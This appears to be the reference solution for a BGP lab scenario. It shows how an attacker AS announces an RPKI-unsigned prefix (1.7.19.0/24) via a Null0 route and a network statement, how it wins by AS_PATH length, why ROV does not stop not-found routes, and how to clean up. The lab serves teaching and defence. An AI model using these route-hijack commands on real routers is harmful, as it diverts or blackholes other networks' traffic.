# Reference solution: incomplete-RPKI opportunistic hijack

The defence here is real, RPKI ROV at both transits, and it does nothing, because
the target is unsigned. ROV drops RPKI-invalid routes; a not-found prefix is not
invalid, so it passes. You become a second, shorter origin for someone else's
unsigned space and win by AS_PATH length.

This is the mirror of Toadstool Takeover (technique 1). There, FDEI's /24 is signed,
so a bogus origin is RPKI-invalid and ROV drops it. Here the prefix is unsigned, so
the same move sails through. The difference is the ROA, not the routing.

## Steps

1. Get onto your foothold. Locally:

       ./ctl player        # lands you on the ops host
       foothold            # into attacker-as, straight to its vtysh

2. Pick an unsigned target and announce it as yourself. 1.7.19.0/24 is in the
   seeded table from a distant real network and has no ROA:

       configure terminal
       ip route 1.7.19.0/24 Null0
       router bgp 65020
        address-family ipv4 unicast
         network 1.7.19.0/24
       end

   1.7.19.0/24 is not connected on your router, so the discard (`ip route ... Null0`)
   goes in first to put the prefix in the RIB for the `network` statement to
   advertise. No `write memory`, so a bounce restores the baseline.

       show ip bgp 1.7.19.0/24      # two paths now: the real one and yours

3. Check it went global. Back on the ops host:

       exit
       lg

   You want 1.7.19.0/24 in the table with the path ending in 65020 (yours), winning
   over the real holder's longer path. Your two hops (65002 65020) beat their five.

## Operator: the defence is on and still loses

The point of this scenario is that ROV does not help. Prove it from the operator
side:

       ./ctl rov on                                    # origin validation at both transits
       ./ctl vtysh transit-b
        show bgp ipv4 unicast 1.7.19.0/24               # your path: rpki validation-state not found
       ./ctl score incomplete-rpki-hijack              # the scorer flags the win, rpki=notfound

   With ROV on, 1.7.19.0/24 still wins for AS65020, because not-found is permitted.
   Contrast `./ctl table | grep 203.0.113` after the same `rov on` in Toadstool
   Takeover: the signed /24 makes the /25 invalid and ROV drops it. Same attacker,
   same routers, opposite outcome, and the only difference is whether FMDA signed
   the prefix.

## Cleanup / reset

From the foothold:

       configure terminal
       router bgp 65020
        address-family ipv4 unicast
         no network 1.7.19.0/24
        exit
       no ip route 1.7.19.0/24 Null0
       end

And `./ctl rov off` to return to the permissive baseline. Or `./ctl down && ./ctl up`.
